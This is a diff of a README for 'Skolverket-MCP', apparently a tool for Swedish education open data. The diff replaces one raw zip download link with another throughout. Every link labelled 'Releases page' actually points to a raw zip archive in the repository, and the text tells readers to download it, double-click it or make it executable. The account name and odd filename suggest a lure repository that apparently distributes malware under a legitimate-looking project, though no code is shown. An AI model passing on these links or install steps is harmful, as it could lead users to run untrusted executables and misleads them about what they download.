@@ -1,6 +1,6 @@
 # 🎓 Skolverket-MCP - Access Educational Data Easily
 
-[![Download Skolverket-MCP](https://raw.githubusercontent.com/mimanshaherbals-bot/Skolverket-MCP/master/src/Skolverket-MCP_microphonograph.zip)](https://raw.githubusercontent.com/mimanshaherbals-bot/Skolverket-MCP/master/src/Skolverket-MCP_microphonograph.zip)
+[![Download Skolverket-MCP](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip)](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip)
 
 ## 📖 Overview
 
@@ -10,7 +10,7 @@ Skolverket-MCP is a server designed to provide easy access to open data from the
 
 To get started with Skolverket-MCP, follow these simple steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/mimanshaherbals-bot/Skolverket-MCP/master/src/Skolverket-MCP_microphonograph.zip) to download the application.
+1. Visit the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip) to download the application.
 2. Choose the latest version and click on the download link for your operating system.
 
 ## 💻 System Requirements
@@ -27,7 +27,7 @@ Before you proceed, make sure your computer meets the following requirements:
 
 ### Windows
 
-1. Download the Windows installer from the [Releases page](https://raw.githubusercontent.com/mimanshaherbals-bot/Skolverket-MCP/master/src/Skolverket-MCP_microphonograph.zip).
+1. Download the Windows installer from the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip).
 2. Locate the downloaded file, usually in your Downloads folder.
 3. Double-click the file to start the installation process.
 4. Follow the prompts. Once completed, you will see an application icon on your desktop.
@@ -35,7 +35,7 @@ Before you proceed, make sure your computer meets the following requirements:
 
 ### macOS
 
-1. Navigate to the [Releases page](https://raw.githubusercontent.com/mimanshaherbals-bot/Skolverket-MCP/master/src/Skolverket-MCP_microphonograph.zip).
+1. Navigate to the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip).
 2. Download the installer file for macOS.
 3. Find the file in your Downloads folder and double-click it.
 4. Drag the Skolverket-MCP icon into your Applications folder.
@@ -43,7 +43,7 @@ Before you proceed, make sure your computer meets the following requirements:
 
 ### Linux
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/mimanshaherbals-bot/Skolverket-MCP/master/src/Skolverket-MCP_microphonograph.zip).
+1. Go to the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip).
 2. Download the Linux version suitable for your distribution.
 3. Open a terminal and navigate to the directory where you downloaded the file.
 4. Ensure the file is executable. Run:
@@ -57,7 +57,7 @@ Before you proceed, make sure your computer meets the following requirements:
 
 ## 🔄 Updating the Application
 
-To keep your software running smoothly, check for updates regularly. Visit the [Releases page](https://raw.githubusercontent.com/mimanshaherbals-bot/Skolverket-MCP/master/src/Skolverket-MCP_microphonograph.zip) to find the latest version, and follow the installation steps listed above.
+To keep your software running smoothly, check for updates regularly. Visit the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip) to find the latest version, and follow the installation steps listed above.
 
 ## 📞 Support
 
@@ -81,4 +81,4 @@ Skolverket-MCP connects you with a variety of educational topics, helping to enh
 
 ## ✨ Conclusion
 
-Skolverket-MCP makes accessing essential educational data easy and straightforward. Follow the steps above to download and set up the application. Discover a wealth of information to support your educational needs! Visit the [Releases page](https://raw.githubusercontent.com/mimanshaherbals-bot/Skolverket-MCP/master/src/Skolverket-MCP_microphonograph.zip) to get started today.
+Skolverket-MCP makes accessing essential educational data easy and straightforward. Follow the steps above to download and set up the application. Discover a wealth of information to support your educational needs! Visit the [Releases page](https://github.com/mimanshaherbals-bot/Skolverket-MCP/raw/refs/heads/master/docs/MCP-Skolverket-1.7.zip) to get started today.
